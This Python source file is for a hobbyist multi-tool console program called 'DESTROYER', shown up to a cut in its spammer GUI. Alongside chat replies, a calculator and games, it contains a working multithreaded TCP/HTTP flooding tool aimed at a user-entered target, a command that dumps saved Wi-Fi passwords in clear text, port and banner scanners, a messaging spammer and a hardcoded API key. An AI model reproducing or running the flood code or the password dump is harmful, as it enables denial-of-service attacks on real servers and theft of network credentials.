import platform
import socket
import time
import weather_forecast as wf
import pyautogui
import random
import phonenumbers
from phonenumbers import geocoder
from tkinter.filedialog  import *
from tkinter.scrolledtext import *
import file_menu
import edit_menu
import format_menu
import help_menu
import pygame
from queue import PriorityQueue
import os
import sys
from PyQt5 import QtWidgets, QtGui, QtCore, QtMultimedia
from progressbar import QRoundProgressBar
import tkinter as tk
from tkinter import ttk
from tkcode import CodeEditor
import threading
import concurrent.futures
import colorama
import folium

path = 'C:/'
host_name = socket.gethostname()
host_ip = socket.gethostbyname(host_name)
#===============================================================================
#  ___________________ _______  ___________ _________.___  _________           |
# /  _____/\_   _____/ \      \ \_   _____//   _____/|   |/   _____/           |
#/   \  ___ |    __)_  /   |   \ |    __)_ \_____  \ |   |\_____  \            |
#\    \_\  \|        \/    |    \|        \/        \|   |/        \           |
# \______  /_______  /\____|__  /_______  /_______  /|___/_______  /           |
#        \/        \/         \/        \/        \/             \/            |
#__________                                 __                                 |
#\______   \ ___________  _____   ____     |__| ____                           |
# |    |  _// __ \_  __ \/     \_/ __ \    |  |/  _ \                          |
# |    |   \  ___/|  | \/  Y Y  \  ___/    |  (  <_> )                         |
# |______  /\___  >__|  |__|_|  /\___  >\__|  |\____/                          |
#        \/     \/            \/     \/\______|                                |
#===============================================================================

print("██████╗░███████╗░██████╗████████╗██████╗░░█████╗░██╗░░░██╗███████╗██████╗░")
print("██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚██╗░██╔╝██╔════╝██╔══██╗")
print("██║░░██║█████╗░░╚█████╗░░░░██║░░░██████╔╝██║░░██║░╚████╔╝░█████╗░░██████╔╝")
print("██║░░██║██╔══╝░░░╚═══██╗░░░██║░░░██╔══██╗██║░░██║░░╚██╔╝░░██╔══╝░░██╔══██╗")
print("██████╔╝███████╗██████╔╝░░░██║░░░██║░░██║╚█████╔╝░░░██║░░░███████╗██║░░██║")
print("╚═════╝░╚══════╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝")
from rich import print
from rich.panel import Panel
print(Panel("AI Named: DESTROYER \n"
            "This is under progress some features when you exit \n"
            "may stop the system code i will try my best to fix it \n"
            "some features like fastscan can only be killed by restarting the code \n"
            "--------------------------------------------------------------------------- \n"
            "made by: Xien Genesis y Bermejo \n"
            "Github: https://github.com/426Wad/426Wad \n"
            "gmail: bermejo.genesis02@gmail.com \n"
            "facebook: https://www.facebook.com/profile.php?id=100068179500747 \n"
            "twitter: https://twitter.com/BermejoXien \n"
            "every  3 months this program will be updated \n"
            "type help for more info, [red]", title="Welcome To", subtitle="DESTROYER"))
while True:
    code = (input("Command>>> "))
    if code == "hi":
        print("system: hi")
    elif code == "how are you?":
        print("system: im fine, how about you?")
    elif code == "im fine too":
        print("system: good")
    elif code == "whats the time?" or code == "time pls":
        print("system: " + time.strftime("%m/%d/%y"))
    elif code == "are you hungry?" or code == "you want food?" or code == "hungry?":
        print("system: its obvious i dont eat because im a program")
    elif code == "chatbot":
        def chat():
            import NZXT

        chat()
#==============================================================================================================================#
    elif code == "ping":
        host = input("Enter Website To Ping: ")
        number = input("Enter How Many Times To Ping: ")

        def ping(host):
            param = '-n' if platform.system().lower() == 'windows' else '-c'
            command = ['ping', param, number, host]
            return subprocess.call(command)
        print(ping(host))
#==============================================================================================================================#
    elif code == "upper":
        upper = (input("enter text to uppercase: "))
        print("You're text converted into uppercase: ",  upper.upper())
#==============================================================================================================================#
    elif code == "lower":
        lower = (input("enter text to lowercase: "))
        print("You're text converted into lowercase: ",  lower.lower())
#==============================================================================================================================#
    elif code == "local":
        print("Your Local IPS Is: " + host_ip)
        print("You Desktop Name Is:" + host_name)
#==============================================================================================================================#
    elif code == "date":
        print("The Local Date Is: " + time.strftime("%m/%d/%y"))
        print("Succesful search!")
#==============================================================================================================================#
    elif code == "length":
        length = (input("Enter your text to measure the length: "))
        print("your Text length is:", + (len(length)))
#==============================================================================================================================#
    elif code == "list":
        dir_list = os.listdir(path)
        print("Files and Directories in '", path, "' :")
        print(dir_list)
#==============================================================================================================================#
    elif code == "help":
        from rich import print
        from rich.panel import Panel

        print(Panel("ping, help, local, date, list, editor, timer, calculator, puzzle, paint, note, address, table, phonenumbers, "
            "bannerscan, fastscan, echo me, list -a, map, scanwifi, wifipass, spammer, host-chat, join-chat, word, phoneprice,"
            " SMS, cipher, [red]", title="Available", subtitle="Commands"))
#==============================================================================================================================#
    elif code == "calculator":
        from rich import print
        from rich.panel import Panel
        from functions import *

        print(Panel("What do you want to do? \n"
                    "{1} Addition \n"
                    "{2} Subtraction \n"
                    "{3} Multiplication \n"
                    "{4} Division \n"
                    "{5} Power, [red]", title="Calculator", subtitle="WIP"))

        choice = input("enter your choice :")

        num1 = float(input("Enter the Number 1 : "))
        num2 = float(input("Enter the Number 2 : "))

        if choice == '1':
            addition(num1, num2)
        elif choice == '2':
            subtraction(num1, num2)
        elif choice == '3':
            multiplication(num1, num2)
        elif choice == '4':
            division(num1, num2)
        elif choice == '5':
            power(num1, num2)
        else:
            print("Invalid Choice")

        print("\n")
#==============================================================================================================================#
    elif code == "weather":
        location = input("Enter Location Here :")
        print('Displaying Weather report for: ' + location)
        Weather = wf.forecast(place=location)

        print(Weather)
#==============================================================================================================================#
    elif code == "cracker":
        chars = "abcdefghijklmnopqrstuvwxyz0123456789"

        # chars = string.printable
        chars_list = list(chars)

        password = pyautogui.password("Enter a password : ")

        guess_password = ""

        while (guess_password != password):
            guess_password = random.choices(chars_list, k=len(password))

            print("<==================" + str(guess_password) + "==================>")

            if (guess_password == list(password)):
                print("Your password is : " + "".join(guess_password))
                break
#==============================================================================================================================#
    elif code == "passgen":
        passlen = int(input("enter the length of the password :"))
        s = "abcdefghijklmnopqrstuvwxyz0123456781234567890!@#$%^&*()"
        p = "".join(random.sample(s, passlen))
        print("your generated passsword is:" + p)
#==============================================================================================================================#
    elif code == "phonenumber":
        number = input("your number: ")

        Key = "d34b6cf27aeb49ff8092c3e5ecf49753"

        smartNumber = phonenumbers.parse(number)

        yourLocation = geocoder.description_for_number(smartNumber, "en")
        (yourLocation)

        ## get service provider

        from phonenumbers import carrier

        service_provider = phonenumbers.parse(number)
        print(carrier.name_for_number(service_provider, "en"))

        from opencage.geocoder import OpenCageGeocode

        geocoder = OpenCageGeocode(Key)

        query = str(yourLocation)

        results = geocoder.geocode(query)
        print(results)

        lat = results[0]['geometry']['lat']

        lng = results[0]['geometry']['lng']

        print(lat, lng)

        myMap = folium.Map(location=[lat, lng], zoom_start=9)

        folium.Marker([lat, lng], popup=yourLocation).add_to((myMap))

        ## save map in html file

        myMap.save("myLocation.html")
#==============================================================================================================================#
    elif code == "paint":
        from tkinter import *
        from tkinter.colorchooser import askcolor
        from PIL import ImageTk, Image


        class Paint(object):

            DEFAULT_PEN_SIZE = 5.0
            DEFAULT_COLOR = 'black'

            def __init__(self):
                self.root = Tk()
                self.root.title('Paint')
                self.root.geometry('500x300')
                self.root.maxsize(500, 300)
                self.root.minsize(500, 300)

                self.paint_tools = Frame(self.root, width=100, height=300, relief=RIDGE, borderwidth=2)
                self.paint_tools.place(x=0, y=0)

                self.pen_logo = ImageTk.PhotoImage(Image.open('pen.png'))
                self.p = Label(self.paint_tools, text="pen", borderwidth=0, font=('verdana', 10, 'bold'))
                self.p.place(x=5, y=11)
                self.pen_button = Button(self.paint_tools, padx=6, image=self.pen_logo, borderwidth=2,
                                         command=self.use_pen)
                self.pen_button.place(x=60, y=10)

                self.brush_logo = ImageTk.PhotoImage(Image.open('brush.png'))
                self.b = Label(self.paint_tools, borderwidth=0, text='brush', font=('verdana', 10, 'bold'))
                self.b.place(x=5, y=40)
                self.brush_button = Button(self.paint_tools, image=self.brush_logo, borderwidth=2,
                                           command=self.use_brush)
                self.brush_button.place(x=60, y=40)

                self.color_logo = ImageTk.PhotoImage(Image.open('color.png'))
                self.cl = Label(self.paint_tools, text='color', font=('verdana', 10, 'bold'))
                self.cl.place(x=5, y=70)
                self.color_button = Button(self.paint_tools, image=self.color_logo, borderwidth=2,
                                           command=self.choose_color)
                self.color_button.place(x=60, y=70)

                self.eraser_logo = ImageTk.PhotoImage(Image.open('eraser.png'))
                self.e = Label(self.paint_tools, text='eraser', font=('verdana', 10, 'bold'))
                self.e.place(x=5, y=100)
                self.eraser_button = Button(self.paint_tools, image=self.eraser_logo, borderwidth=2,
                                            command=self.use_eraser)
                self.eraser_button.place(x=60, y=100)

                self.pen_size = Label(self.paint_tools, text="Pen Size", font=('verdana', 10, 'bold'))
                self.pen_size.place(x=15, y=250)
                self.choose_size_button = Scale(self.paint_tools, from_=1, to=10, orient=VERTICAL)
                self.choose_size_button.place(x=20, y=150)

                self.c = Canvas(self.root, bg='white', width=600, height=600, relief=RIDGE, borderwidth=0)
                self.c.place(x=100, y=0)

                self.setup()
                self.root.mainloop()

            def setup(self):
                self.old_x = None
                self.old_y = None
                self.line_width = self.choose_size_button.get()
                self.color = self.DEFAULT_COLOR
                self.eraser_on = False
                self.active_button = self.pen_button
                self.c.bind('<B1-Motion>', self.paint)
                self.c.bind('<ButtonRelease-1>', self.reset)

            def use_pen(self):
                self.activate_button(self.pen_button)

            def use_brush(self):
                self.activate_button(self.brush_button)

            def choose_color(self):
                self.eraser_on = False
                self.color = askcolor(color=self.color)[1]

            def use_eraser(self):
                self.activate_button(self.eraser_button, eraser_mode=True)

            def activate_button(self, some_button, eraser_mode=False):
                self.active_button.config(relief=RAISED)
                some_button.config(relief=SUNKEN)
                self.active_button = some_button
                self.eraser_on = eraser_mode

            def paint(self, event):
                self.line_width = self.choose_size_button.get()
                paint_color = 'white' if self.eraser_on else self.color
                if self.old_x and self.old_y:
                    self.c.create_line(self.old_x, self.old_y, event.x, event.y,
                                       width=self.line_width, fill=paint_color,
                                       capstyle=ROUND, smooth=TRUE, splinesteps=36)
                self.old_x = event.x
                self.old_y = event.y

            def reset(self, event):
                self.old_x, self.old_y = None, None


        if __name__ == '__main__':
            Paint()
#==============================================================================================================================#
    elif code == "note":
        root = Tk()

        root.title("Text Editor made by:Genesis")
        root.geometry("300x250+300+300")
        root.minsize(width=400, height=400)

        text = ScrolledText(root, state='normal', height=400, width=400, wrap='word', pady=2, padx=3, undo=True)
        text.pack(fill=Y, expand=1)
        text.focus_set()

        menubar = Menu(root)

        file_menu.main(root, text, menubar)
        edit_menu.main(root, text, menubar)
        format_menu.main(root, text, menubar)
        help_menu.main(root, text, menubar)
        root.mainloop()
#==============================================================================================================================#
    elif code == "table":
        number = int(input("table to print: "))
        for i in range(1, 100):
            print(number, "x", i, "=", number * i)
#==============================================================================================================================#
    elif code == "puzzle":
        WIDTH = 800
        WIN = pygame.display.set_mode((WIDTH, WIDTH))
        pygame.display.set_caption("A* Path Finding Algorithm")

        RED = (255, 0, 0)
        GREEN = (0, 255, 0)
        BLUE = (0, 255, 0)
        YELLOW = (255, 255, 0)
        WHITE = (255, 255, 255)
        BLACK = (0, 0, 0)
        PURPLE = (128, 0, 128)
        ORANGE = (255, 165, 0)
        GREY = (128, 128, 128)
        TURQUOISE = (64, 224, 208)


        class Spot:
            def __init__(self, row, col, width, total_rows):
                self.row = row
                self.col = col
                self.x = row * width
                self.y = col * width
                self.color = WHITE
                self.neighbors = []
                self.width = width
                self.total_rows = total_rows

            def get_pos(self):
                return self.row, self.col

            def is_closed(self):
                return self.color == RED

            def is_open(self):
                return self.color == GREEN

            def is_barrier(self):
                return self.color == BLACK

            def is_start(self):
                return self.color == ORANGE

            def is_end(self):
                return self.color == TURQUOISE

            def reset(self):
                self.color = WHITE

            def make_start(self):
                self.color = ORANGE

            def make_closed(self):
                self.color = RED

            def make_open(self):
                self.color = GREEN

            def make_barrier(self):
                self.color = BLACK

            def make_end(self):
                self.color = TURQUOISE

            def make_path(self):
                self.color = PURPLE

            def draw(self, win):
                pygame.draw.rect(win, self.color, (self.x, self.y, self.width, self.width))

            def update_neighbors(self, grid):
                self.neighbors = []
                if self.row < self.total_rows - 1 and not grid[self.row + 1][self.col].is_barrier():  # DOWN
                    self.neighbors.append(grid[self.row + 1][self.col])

                if self.row > 0 and not grid[self.row - 1][self.col].is_barrier():  # UP
                    self.neighbors.append(grid[self.row - 1][self.col])

                if self.col < self.total_rows - 1 and not grid[self.row][self.col + 1].is_barrier():  # RIGHT
                    self.neighbors.append(grid[self.row][self.col + 1])

                if self.col > 0 and not grid[self.row][self.col - 1].is_barrier():  # LEFT
                    self.neighbors.append(grid[self.row][self.col - 1])

            def __lt__(self, other):
                return False


        def h(p1, p2):
            x1, y1 = p1
            x2, y2 = p2
            return abs(x1 - x2) + abs(y1 - y2)


        def reconstruct_path(came_from, current, draw):
            while current in came_from:
                current = came_from[current]
                current.make_path()
                draw()


        def algorithm(draw, grid, start, end):
            count = 0
            open_set = PriorityQueue()
            open_set.put((0, count, start))
            came_from = {}
            g_score = {spot: float("inf") for row in grid for spot in row}
            g_score[start] = 0
            f_score = {spot: float("inf") for row in grid for spot in row}
            f_score[start] = h(start.get_pos(), end.get_pos())

            open_set_hash = {start}

            while not open_set.empty():
                for event in pygame.event.get():
                    if event.type == pygame.QUIT:
                        pygame.quit()

                current = open_set.get()[2]
                open_set_hash.remove(current)

                if current == end:
                    reconstruct_path(came_from, end, draw)
                    end.make_end()
                    return True

                for neighbor in current.neighbors:
                    temp_g_score = g_score[current] + 1

                    if temp_g_score < g_score[neighbor]:
                        came_from[neighbor] = current
                        g_score[neighbor] = temp_g_score
                        f_score[neighbor] = temp_g_score + h(neighbor.get_pos(), end.get_pos())
                        if neighbor not in open_set_hash:
                            count += 1
                            open_set.put((f_score[neighbor], count, neighbor))
                            open_set_hash.add(neighbor)
                            neighbor.make_open()

                draw()

                if current != start:
                    current.make_closed()

            return False


        def make_grid(rows, width):
            grid = []
            gap = width // rows
            for i in range(rows):
                grid.append([])
                for j in range(rows):
                    spot = Spot(i, j, gap, rows)
                    grid[i].append(spot)

            return grid


        def draw_grid(win, rows, width):
            gap = width // rows
            for i in range(rows):
                pygame.draw.line(win, GREY, (0, i * gap), (width, i * gap))
                for j in range(rows):
                    pygame.draw.line(win, GREY, (j * gap, 0), (j * gap, width))


        def draw(win, grid, rows, width):
            win.fill(WHITE)

            for row in grid:
                for spot in row:
                    spot.draw(win)

            draw_grid(win, rows, width)
            pygame.display.update()


        def get_clicked_pos(pos, rows, width):
            gap = width // rows
            y, x = pos

            row = y // gap
            col = x // gap

            return row, col


        def main(win, width):
            ROWS = 50
            grid = make_grid(ROWS, width)

            start = None
            end = None

            run = True
            while run:
                draw(win, grid, ROWS, width)
                for event in pygame.event.get():
                    if event.type == pygame.QUIT:
                        run = False

                    if pygame.mouse.get_pressed()[0]:  # LEFT
                        pos = pygame.mouse.get_pos()
                        row, col = get_clicked_pos(pos, ROWS, width)
                        spot = grid[row][col]
                        if not start and spot != end:
                            start = spot
                            start.make_start()

                        elif not end and spot != start:
                            end = spot
                            end.make_end()

                        elif spot != end and spot != start:
                            spot.make_barrier()

                    elif pygame.mouse.get_pressed()[2]:  # RIGHT
                        pos = pygame.mouse.get_pos()
                        row, col = get_clicked_pos(pos, ROWS, width)
                        spot = grid[row][col]
                        spot.reset()
                        if spot == start:
                            start = None
                        elif spot == end:
                            end = None

                    if event.type == pygame.KEYDOWN:
                        if event.key == pygame.K_SPACE and start and end:
                            for row in grid:
                                for spot in row:
                                    spot.update_neighbors(grid)

                            algorithm(lambda: draw(win, grid, ROWS, width), grid, start, end)

                        if event.key == pygame.K_c:
                            start = None
                            end = None
                            grid = make_grid(ROWS, width)

            pygame.quit()


        main(WIN, WIDTH)
#==============================================================================================================================#
    elif code == "timer":
        TIME_COUNT = 60 * 1
        SOUND_FILE = os.path.join("sound", "tick_sound_small.wav")


        class HomeWindow(QtWidgets.QMainWindow):
            def __init__(self):
                super(HomeWindow, self).__init__()

                self.setWindowTitle("Circular Timer")

                self.central_widget = QtWidgets.QWidget(self)
                self.resize(QtCore.QSize(560, 560))
                self.setCentralWidget(self.central_widget)

                self.grid_layout1 = QtWidgets.QGridLayout(self.central_widget)
                self.central_widget.setLayout(self.grid_layout1)

                # ------------------- CREATE PROGRESS BAR -------------------------
                self.progress_bar = QRoundProgressBar(self.central_widget)
                self.progress_bar.decimals = 0
                self.progress_bar.setFixedSize(300, 300)
                self.progress_bar.setDataPenWidth(3)
                self.progress_bar.set_outline_pen_width(3)
                self.progress_bar.setDonutThicknessRatio(0.85)
                self.progress_bar.setDecimals(1)
                self.progress_bar.set_format("%p")
                # self.bar.resetFormat()
                self.progress_bar.set_null_position(90)
                self.progress_bar.value = 0
                self.progress_bar.setBarStyle(QRoundProgressBar.StylePie)

                # set color gradient
                self.progress_bar.setDataColors([(0., QtGui.QColor.fromRgb(255, 51, 51)),
                                                 (0.5, QtGui.QColor.fromRgb(204, 0, 0)),
                                                 (1., QtGui.QColor.fromRgb(92, 7, 7))])

                self.grid_layout1.addWidget(self.progress_bar)
                # --------------------- PROGRESSBAR END --------------------------

                self.push_button_start = QtWidgets.QPushButton("start", self.central_widget)
                self.grid_layout1.addWidget(self.push_button_start)

                self.push_button_start.clicked.connect(self.start_timer)
                # self.play_tick()

            def play_tick(self):
                self.sound = QtMultimedia.QSoundEffect()
                self.sound.setSource(QtCore.QUrl.fromLocalFile(SOUND_FILE))
                self.sound.setLoopCount(QtMultimedia.QSoundEffect.Infinite)
                self.sound.setVolume(100)
                self.sound.play()

            def start_timer(self):
                self.time_count = 0
                # set progressbar value and range
                self.progress_bar.set_range(0, TIME_COUNT)
                self.progress_bar._value = 0.0
                self.progress_bar.info_trail_str = " seconds"

                self.update_data()  # call first time for immediate response
                self.play_tick()

                self.timer = QtCore.QTimer()
                self.timer.setInterval(1000)
                self.timer.timeout.connect(self.update_data)
                self.timer.start()

                self.push_button_start.setDisabled(True)

            def check_time(self):
                if self.time_count >= TIME_COUNT:
                    print("Timer stopped")
                    self.timer.stop()
                    self.value_animation.stop()
                    self.progress_bar.value = TIME_COUNT
                    self.push_button_start.setDisabled(False)
                    self.sound.stop()
                self.update()

            def update_data(self):
                self.time_count += 1.0

                # self.play_tick()

                self.value_animation = QtCore.QPropertyAnimation(self.progress_bar, b'value')
                self.value_animation.setStartValue(self.time_count - 1)
                self.value_animation.setEndValue(self.time_count)
                self.value_animation.setDuration(1000)
                self.value_animation.setLoopCount(5)
                self.value_animation.setEasingCurve(QtCore.QEasingCurve.Linear)
                self.value_animation.start()

                self.check_time()


        if __name__ == '__main__':
            app = QtWidgets.QApplication(sys.argv)
            w = HomeWindow()
            w.show()
            sys.exit(app.exec())
#==============================================================================================================================#
    elif code == "address":
            from ip2geotools.databases.noncommercial import DbIpCity

            url = input("Insert a URL: ")
            ip = socket.gethostbyname(url)
            response = DbIpCity.get(ip, api_key='free')
            print("IP:", ip)
            print("City:", response.city)
            print("Region:", response.region)
            print("Country:", response.country)
            print("===============================")
#==============================================================================================================================#
    elif code == "editor":
        code = input("Enter file name : ")

        root = tk.Tk()
        root.title("Code Editor")
        root.option_add("*tearOff", 0)

        notebook = ttk.Notebook(root)
        tab_1 = ttk.Frame(notebook)
        notebook.add(tab_1, text=code + '.py')
        notebook.pack(fill="both", expand=True)

        code_editor = CodeEditor(
            tab_1,
            width=99,
            height=30,
            language="python",
            background="black",
            highlighter="dracula",
            font="Consolas",
            autofocus=True,
            blockcursor=True,
            insertofftime=0,
            padx=10,
            pady=10,

        )
        code_editor.pack(fill="both", expand=True)
        code_editor.content = """print("Hello World")"""
        root.update()
        root.minsize(root.winfo_width(), root.winfo_height())
        root.mainloop()
#==============================================================================================================================#
    elif code == 'list -a':
        file = input("Enter The Direct File Path To Read: ")
        dir_list2 = os.listdir(file)
        print("Files and directories in '", file, "':")
        print(dir_list2)
#==============================================================================================================================#
    elif code == 'echo me':
        echo = input("What Do You Want Me To Echo: ")
        print(echo)
#==============================================================================================================================#
    elif code == "google" or code == "browser":
        import sys
        from PyQt5.QtCore import *
        from PyQt5.QtWidgets import *
        from PyQt5.QtWebEngineWidgets import *


        class MainWindow(QMainWindow):
            def __init__(self):
                super(MainWindow, self).__init__()
                self.browser = QWebEngineView()
                self.browser.setUrl(QUrl('http://google.com'))
                self.setCentralWidget(self.browser)
                self.showMaximized()

                # navbar
                navbar = QToolBar()
                self.addToolBar(navbar)

                back_btn = QAction('Back', self)
                back_btn.triggered.connect(self.browser.back)
                navbar.addAction(back_btn)

                forward_btn = QAction('Forward', self)
                forward_btn.triggered.connect(self.browser.forward)
                navbar.addAction(forward_btn)

                reload_btn = QAction('Reload', self)
                reload_btn.triggered.connect(self.browser.reload)
                navbar.addAction(reload_btn)

                home_btn = QAction('Home', self)
                home_btn.triggered.connect(self.navigate_home)
                navbar.addAction(home_btn)

                self.url_bar = QLineEdit()
                self.url_bar.returnPressed.connect(self.navigate_to_url)
                navbar.addWidget(self.url_bar)

                self.browser.urlChanged.connect(self.update_url)

            def navigate_home(self):
                self.browser.setUrl(QUrl('http://google.com'))

            def navigate_to_url(self):
                url = self.url_bar.text()
                self.browser.setUrl(QUrl(url))

            def update_url(self, q):
                self.url_bar.setText(q.toString())


        app = QApplication(sys.argv)
        QApplication.setApplicationName('LOL FREE BROWSER')
        window = MainWindow()
        app.exec_()
#==============================================================================================================================#
    elif code == "tcpflood" or code == "tcp":
        useragents = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
                      "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
                      "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
                      "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
                      "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
                      "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
                      "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
                      "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
                      "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
                      "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
                      "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
                      "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
                      "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
                      "Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
                      "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
                      "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
        ref = ['http://www.bing.com/search?q=',
               'https://www.yandex.com/yandsearch?text=',
               'https://duckduckgo.com/?q=']
        acceptall = [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
            "Accept-Encoding: gzip, deflate\r\n",
            "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
            "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
            "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
            "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
            "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
            "Accept-Language: en-US,en;q=0.5\r\n"]

        ip = str(input('[+] Target: '))
        port = int(input('[+] Port: '))
        pack = int(input('[+] Packet/s: '))
        thread = int(input('[+] Threads: '))


        def start():
            global useragents, ref, acceptall
            hh = random._urandom(3016)
            xx = int(0)
            useragen = "User-Agent: " + random.choice(useragents) + "\r\n"
            accept = random.choice(acceptall)
            reffer = "Referer: " + random.choice(ref) + str(ip) + "\r\n"
            content = "Content-Type: application/x-www-form-urlencoded\r\n"
            length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
            target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
            main_req = target_host + useragen + accept + reffer + content + length + "\r\n"
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((str(ip), int(port)))
                    s.send(str.encode(main_req))
                    for i in range(pack):
                        s.send(str.encode(main_req))
                    xx += random.randint(0, int(pack))
                    print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
                except:
                    s.close()
                    print('[+] Server Down.')


        for x in range(thread):
            thred = threading.Thread(target=start)
            thred.start()
#==============================================================================================================================#
    elif code == "portscan":
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)

        host = input("Please enter the IP you want to scan: ")
        port = int(input("Please enter the port you want to scan: "))


        def portScanner(port):
            if s.connect_ex((host, port)):
                print("The port is closed")
            else:
                print("The port is open")


        portScanner(port)
#==============================================================================================================================#
    elif code == "bannerscan":
        def banner(ip, port):
            s = socket.socket()
            s.connect((ip, int(port)))
            s.settimeout(5)
            print(s.recv(1024))


        def main():
            ip = input("Please enter the IP: ")
            port = str(input("Please enter the port: "))
            banner(ip, port)


        main()
#==============================================================================================================================#
    elif code == "fastscan":
        colorama.init()

        print_lock = threading.Lock()

        ip = input("Enter the IP to scan: ")

        def scan(ip, port):
            scanner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            scanner.settimeout(1)
            try:
                scanner.connect((ip, port))
                scanner.close()
                with print_lock:
                    print(Fore.WHITE + f"[{port}]" + Fore.GREEN + " Opened")
            except:
                pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            for port in range(1000):
                executor.submit(scan, ip, port + 1)
#==============================================================================================================================#
    elif code == "map":
        map = folium.Map(location=[15.067186436308049, 120.72436857205847],zoom_start=15)

        map.save("map.html")
#==============================================================================================================================#
    elif code == "scanwifi":
        import subprocess
        nw = subprocess.check_output(['netsh', 'wlan', 'show', 'network'])
        decoded_nw = nw.decode('ascii')
        print(decoded_nw)
#==============================================================================================================================#
    elif code == "wifipass":
        import subprocess

        a = subprocess.check_output(['netsh', 'wlan', 'show', 'profile']).decode('utf-8').split('\n')

        a = [i.split(":") [1] [1:-1] for i in a if "All User Profile" in i]

        for i in a:
            results = subprocess.check_output(
                ['netsh', 'wlan', 'show', 'profile',i,'key=clear']).decode('utf-8').split("\n")

            results = [b.split(":") [1] [1:-1] for b in results if "Key Content" in b]

            try:
                print("{:<30}| {:<}".format(i,results[0]))
            except IndexError:
                print("{:<30}| {:<}".format(1, ""))
#==============================================================================================================================#
    elif code == "host-chat":
        import socket
        import sys
        import time

        s = socket.socket()

        host = socket.gethostname()
        print("Server will start on host:", host)
        port = 1234
        s.bind((host, port))
        print("Server is bound successfully")
        s.listen(1)
        conn, addr = s.accept()
        print(addr, "has connected")
        while 1:
            message = input(str("You:>>"))
            message = message.encode()
            conn.send(message)
            incoming_message = conn.recv(1024)
            incoming_message = incoming_message.decode()
            print("Client:>>", incoming_message)
#==============================================================================================================================#
    elif code == "join-chat":
        import socket
        import sys
        import time

        s = socket.socket()
        host = input(str("Please enter host name:"))
        port = 1234
        try:
            s.connect((host, port))
            print("connected to server")
        except:
            print("connection to server is failed : (")
        while 1:
            incoming_message = s.recv(1024)
            incoming_message = incoming_message.decode()
            print("Server:>>", incoming_message)
            message = input(str("You:>>"))
            message = message.encode()
            s.send(message)
#==============================================================================================================================#
    elif code == "spammer":
        import PySimpleGUI as sg
        import queue
        import threading
        import settings
        import spammer


        def long_operation_thread():
            spammer.start_spam()


        # The UI
        def the_gui():
            # sets theme
            sg.ChangeLookAndFeel('DarkBlue9')
            gui_queue = queue.Queue()

            # Output Console
            output = [
                [sg.Frame(layout=[
                    [sg.Output(size=(42, 8), pad=(0, 0))],
                ], title='Output', title_color="#ffffff")], ]

            # Main Layout
            layout = [
                [sg.Frame(layout=[
                    [sg.Text('Choose Platform:', size=(17, 1), font=("Roboto", 8)),
                     sg.InputCombo(('Discord', 'Whatsapp', 'Messenger'), default_value="Discord", key="source",
                                   size=(25, 1))],
                    [sg.Text('Friend Name:', size=(17, 1), font=("Roboto", 8)),
                     sg.InputText('', key="friend_name", size=(27, 1))],
